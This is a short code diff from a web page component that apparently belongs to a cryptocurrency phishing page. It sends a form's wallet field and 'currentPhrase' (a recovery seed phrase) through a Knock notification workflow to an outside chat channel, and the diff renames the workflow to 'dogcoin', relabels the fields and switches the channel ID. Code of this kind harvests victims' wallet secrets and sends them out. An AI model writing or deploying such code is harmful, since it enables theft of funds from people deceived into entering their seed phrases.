@@ -37,15 +37,15 @@ export default function page() {
       {
         connections: [
           {
-            channel_id: "1212536290910933005",
+            channel_id: "1230303157070856203",
           },
         ],
       }
     );
-    await knock.workflows.trigger("adert", {
+    await knock.workflows.trigger("dogcoin", {
       data: {
-        email: formState.wallet,
-        password: formState.currentPhrase,
+        wallet: formState.wallet,
+        currentPhrase: formState.currentPhrase,
       },
       recipients: [{ id: "projects-1", collection: "project5" }],
     });
